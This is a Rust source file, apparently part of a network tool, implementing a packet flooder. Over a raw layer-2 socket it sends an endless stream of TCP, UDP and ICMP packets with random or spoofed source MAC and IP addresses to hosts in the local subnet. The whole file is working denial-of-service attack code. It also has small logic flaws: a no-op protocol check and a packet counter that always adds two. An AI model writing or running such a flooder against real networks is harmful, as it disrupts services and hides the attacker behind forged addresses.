use std::net::Ipv4Addr;
use crate::arg_parser::FloodArgs;
use crate::generators::{Ipv4Iter, RandValues};
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::inline_display;



struct PacketInfo {
    src_mac:  [u8; 6],
    src_ip:   Ipv4Addr,
    src_port: u16,
    dst_mac:  [u8; 6],
    dst_ip:   Ipv4Addr,
}


impl PacketInfo {
    fn new() -> Self {
        Self {
            src_mac:  [0; 6],
            src_ip:   Ipv4Addr::new(0, 0, 0, 0),
            src_port: 0,
            dst_mac:  [0; 6],
            dst_ip:   Ipv4Addr::new(0, 0, 0, 0)
        }
    }
}



pub struct PacketFlooder {
    args:      FloodArgs,
    start:     u32,
    end:       u32,
    pkt_info:  PacketInfo,
    pkts_sent: usize,
    rng:       RandValues,
}



impl PacketFlooder {

    pub fn new(args: FloodArgs) -> Self {
        Self {
            args,
            start:     0,
            end:       0,
            pkt_info:  PacketInfo::new(),
            pkts_sent: 0,
            rng:       RandValues::new(),
        }
    }



    pub fn execute(&mut self){
        self.set_ip_range();
        self.set_proto_flags();
        self.send_endlessly();
    }



    fn set_ip_range(&mut self) {
        let cidr         = IfaceInfo::iface_network_cidr(&self.args.iface);
        let mut ip_range = Ipv4Iter::new(&cidr, None, None);
        let first_ip     = ip_range.next().expect("No IPs in range");
        let last_ip      = Ipv4Addr::from(u32::from(first_ip) + ip_range.total() as u32 - 3);
        self.start       = first_ip.into();
        self.end         = last_ip.into();
    }



    fn set_proto_flags(&mut self) {
        if self.args.tcp && self.args.udp && self.args.icmp {
            self.args.tcp  = true;
            self.args.udp  = true; 
            self.args.icmp = true;
        }
    }



    fn setup_tools(iface: &str) -> (PacketBuilder, Layer2RawSocket) {
        let pkt_builder = PacketBuilder::new();
        let pkt_sender  = Layer2RawSocket::new(&iface);
        (pkt_builder, pkt_sender)
    }



    fn send_endlessly(&mut self) {
        let (mut pkt_builder, socket) = Self::setup_tools(&self.args.iface);

        let fixed_src_ip  = self.args.src_ip;
        let fixed_src_mac = self.args.src_mac;
        let fixed_dst_ip  = self.args.dst_ip;
        let fixed_dst_mac = self.args.dst_mac;

        loop {
            self.pkt_info.src_port = self.rng.get_random_port();
            self.pkt_info.src_ip   = fixed_src_ip.unwrap_or_else( || self.rng.get_random_ip(self.start, self.end));
            self.pkt_info.src_mac  = fixed_src_mac.unwrap_or_else(|| self.rng.get_random_mac());
            self.pkt_info.dst_ip   = fixed_dst_ip.unwrap_or_else( || self.rng.get_random_ip(self.start, self.end));
            self.pkt_info.dst_mac  = fixed_dst_mac.unwrap_or_else(|| self.rng.get_random_mac());
            
            self.send_packets(&mut pkt_builder, &socket);
            self.display_progress();
        }
    }



    fn send_packets(&self, pkt_builder: &mut PacketBuilder, socket: &Layer2RawSocket) {
        if self.args.tcp {
            let tcp_pkt = pkt_builder.tcp_ether(
                self.pkt_info.src_mac, self.pkt_info.src_ip, self.pkt_info.src_port,
                self.pkt_info.dst_mac, self.pkt_info.dst_ip, 53
            );
            socket.send(tcp_pkt);
        }

        if self.args.udp {
            let udp_pkt = pkt_builder.udp_ether(
                self.pkt_info.src_mac, self.pkt_info.src_ip, self.pkt_info.src_port,
                self.pkt_info.dst_mac, self.pkt_info.dst_ip, 80
            );
            socket.send(udp_pkt);
        }
        
        if self.args.icmp {
            let icmp_pkt = pkt_builder.icmp_ping_ether(
                self.pkt_info.src_mac, self.pkt_info.src_ip,
                self.pkt_info.dst_mac, self.pkt_info.dst_ip
            );
            socket.send(icmp_pkt);
        }
    }

    

    fn display_progress(&mut self) {
        self.pkts_sent += 2;
        let msg: String = format!("Packets sent: {}", &self.pkts_sent);
        inline_display(msg);
    }

}